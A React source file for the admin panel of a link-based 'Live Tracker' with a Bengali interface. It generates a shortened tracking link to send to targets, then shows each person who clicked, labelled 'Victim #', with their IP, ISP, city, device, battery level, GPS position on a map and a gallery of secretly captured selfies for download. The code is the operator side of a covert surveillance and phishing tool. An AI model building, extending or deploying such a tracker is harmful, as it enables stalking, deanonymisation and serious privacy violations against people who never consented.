
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: { name: string; model: string; userAgent: string; };
  battery?: { level: number; charging: boolean };
  location?: { lat: number; lng: number; accuracy: number } | string;
  photoUrls?: string[];
  firstPhoto?: string;
  ip?: string;
  city?: string;
  isp?: string;
  network?: string;
  status?: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      data.sort((a, b) => (a.timestamp?.seconds || 0) - (b.timestamp?.seconds || 0));
      setLogs([...data].reverse());
      setLoading(false);
    });
    return () => unsubscribe();
  }, [user.uid]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const generateTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) setShortUrl(await response.text());
    } catch (e) { alert("API failed"); }
    setShortening(false);
  };

  return (
    <div className="min-h-screen bg-[#F1F5F9] font-['Hind_Siliguri']">
      <nav className="bg-white/80 backdrop-blur-md border-b border-slate-200 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
        <div className="flex items-center gap-3">
           <div className="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-200">
              <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
           </div>
           <div>
              <h1 className="text-sm font-black text-slate-800 leading-none">অ্যাডমিন প্যানেল</h1>
              <p className="text-[9px] font-bold text-slate-400 uppercase mt-1">Live Tracker v8.2</p>
           </div>
        </div>
        <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-5 py-2.5 rounded-2xl text-[10px] font-black hover:bg-red-100 transition-all">লগ আউট</button>
      </nav>

      <main className="max-w-4xl mx-auto p-4 md:p-8 space-y-6">
        {/* Header Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
           <div className="md:col-span-2 bg-slate-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden group">
              <div className="absolute -right-10 -top-10 w-40 h-40 bg-blue-600/20 rounded-full blur-3xl group-hover:bg-blue-600/40 transition-all"></div>
              <h2 className="text-2xl font-black mb-1">স্বাগতম, {user.displayName?.split(' ')[0]}</h2>
              <p className="text-slate-400 text-xs font-medium">আপনার লিংকে ক্লিক করা ভিক্টিমদের তালিকা নিচে দেখুন।</p>
           </div>
           <div className="bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm flex flex-col items-center justify-center text-center">
              <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">মোট ভিক্টিম</p>
              <h3 className="text-6xl font-black text-blue-600">{logs.length}</h3>
           </div>
        </div>

        {/* Link Box */}
        <div className="bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm space-y-5">
           <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
              <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">শেয়ার করার জন্য লিংক</p>
           </div>
           <div className="flex flex-col md:flex-row gap-3">
              <input readOnly value={shortUrl || trackerLink} className="flex-1 bg-slate-50 border border-slate-200 px-6 py-4 rounded-2xl text-[11px] font-mono text-blue-700 outline-none" />
              <div className="flex gap-2">
                <button onClick={() => copyToClipboard(shortUrl || trackerLink)} className="flex-1 bg-slate-900 text-white px-8 py-4 rounded-2xl text-xs font-black shadow-lg shadow-slate-200 hover:scale-[1.02] transition-all">
                  {copySuccess ? 'কপি হয়েছে' : 'কপি করুন'}
                </button>
                {!shortUrl && (
                  <button onClick={generateTinyUrl} disabled={shortening} className="flex-1 bg-blue-600 text-white px-8 py-4 rounded-2xl text-xs font-black shadow-lg shadow-blue-100 hover:scale-[1.02] transition-all">
                    {shortening ? '...' : 'TinyURL'}
                  </button>
                )}
              </div>
           </div>
        </div>

        {/* Log Cards */}
        <div className="space-y-4">
           <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest px-4 flex items-center justify-between">
              রিয়েল-টাইম রিপোর্টস
              <span className="text-[9px] bg-blue-100 text-blue-600 px-2 py-0.5 rounded-full">Updated Just Now</span>
           </h3>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              {logs.map((log, index) => {
                const vNum = logs.length - index;
                const isLocationValid = typeof log.location === 'object' && log.location !== null;
                return (
                  <div key={log.id} className="bg-white p-7 rounded-[40px] border border-slate-200 shadow-sm relative overflow-hidden group hover:border-blue-400 transition-all">
                     <div className="absolute top-6 right-8 bg-blue-50 text-blue-600 px-4 py-1.5 rounded-full text-[10px] font-black uppercase">
                       Victim #{vNum}
                     </div>
                     
                     <div className="space-y-5">
                        <div className="pt-2">
                           <p className="text-[9px] font-black text-slate-400 uppercase mb-1.5">Network & Identity</p>
                           <p className="text-sm font-black text-slate-800">{log.isp || 'WiFi/Mobile Data'}</p>
                           <p className="text-[11px] text-blue-600 font-bold font-mono mt-0.5">{log.ip}</p>
                        </div>

                        <div className="grid grid-cols-2 gap-3">
                           <div className="bg-slate-50 p-4 rounded-3xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase mb-1">Device Info</p>
                              <p className="text-[11px] font-black text-slate-700 truncate">{log.device?.name} ({log.device?.model})</p>
                           </div>
                           <div className="bg-slate-50 p-4 rounded-3xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase mb-1">Battery / City</p>
                              <p className="text-[11px] font-black text-slate-700">{log.battery ? `${log.battery.level}%` : 'N/A'} • {log.city || '??'}</p>
                           </div>
                        </div>

                        <div className="flex gap-3">
                           <button 
                             onClick={() => setViewPhotos(log.photoUrls || (log.firstPhoto ? [log.firstPhoto] : []))}
                             className="flex-1 bg-slate-900 text-white py-4 rounded-2xl text-[11px] font-black shadow-lg shadow-slate-100"
                           >
                             সেলফি ({log.photoUrls?.length || (log.firstPhoto ? 1 : 0)})
                           </button>
                           {isLocationValid && (
                             <button 
                               onClick={() => setViewMap(log.location as any)}
                               className="flex-1 bg-blue-600 text-white py-4 rounded-2xl text-[11px] font-black shadow-lg shadow-blue-100"
                             >
                               ম্যাপ দেখুন
                             </button>
                           )}
                        </div>
                        
                        <div className="flex items-center justify-between pt-2 border-t border-slate-50">
                           <span className={`text-[8px] font-black uppercase ${log.status === 'Completed' ? 'text-green-500' : 'text-orange-400'}`}>
                             Status: {log.status}
                           </span>
                           <span className="text-[9px] text-slate-300 font-bold font-mono italic">
                             {log.timestamp?.toDate().toLocaleString('bn-BD')}
                           </span>
                        </div>
                     </div>
                  </div>
                );
              })}
              {logs.length === 0 && !loading && (
                <div className="col-span-full py-20 bg-white rounded-[40px] border-2 border-dashed border-slate-200 text-center">
                   <p className="text-slate-400 font-bold">এখনও কোনো ভিক্টিম পাওয়া যায়নি।</p>
                </div>
              )}
           </div>
        </div>
      </main>

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-xl rounded-[40px] overflow-hidden shadow-2xl">
              <div className="p-6 border-b flex justify-between items-center bg-slate-50">
                 <h4 className="font-black text-slate-800">ভিক্টিম লাইভ ম্যাপ</h4>
                 <button onClick={() => setViewMap(null)} className="w-10 h-10 bg-white rounded-full flex items-center justify-center text-slate-400 hover:text-red-500 transition-colors shadow-sm">✕</button>
              </div>
              <div className="aspect-video w-full bg-slate-100">
                 <iframe 
                    width="100%" 
                    height="100%" 
                    frameBorder="0" 
                    src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=16&output=embed`}
                 />
              </div>
              <div className="p-6 flex gap-3">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="flex-1 bg-blue-600 text-white py-4 rounded-2xl font-black text-xs text-center shadow-lg shadow-blue-100">Open Google Maps</a>
                 <button onClick={() => setViewMap(null)} className="flex-1 bg-slate-100 text-slate-600 py-4 rounded-2xl font-black text-xs">বন্ধ করুন</button>
              </div>
           </div>
        </div>
      )}

      {/* Photo Modal */}
      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-2xl rounded-[40px] overflow-hidden">
              <div className="p-6 border-b flex justify-between items-center">
                 <h4 className="font-black text-slate-800">সংগৃহীত সেলফি গ্যালারি</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-10 h-10 bg-slate-50 rounded-full flex items-center justify-center text-slate-400">✕</button>
              </div>
              <div className="p-6 grid grid-cols-2 md:grid-cols-3 gap-4 overflow-y-auto max-h-[60vh] bg-slate-50">
                 {viewPhotos.map((url, i) => (
                   <div key={i} className="group relative">
                      <img src={url} className="rounded-3xl border-4 border-white shadow-md aspect-square object-cover bg-white" />
                      <a href={url} download={`selfie_${i}.jpg`} className="absolute inset-0 flex items-center justify-center bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity rounded-3xl">
                         <span className="text-white font-black text-[10px] uppercase">Download</span>
                      </a>
                   </div>
                 ))}
              </div>
              <div className="p-6 text-center bg-white">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-12 py-4 rounded-2xl font-black text-xs">গ্যালারি বন্ধ করুন</button>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
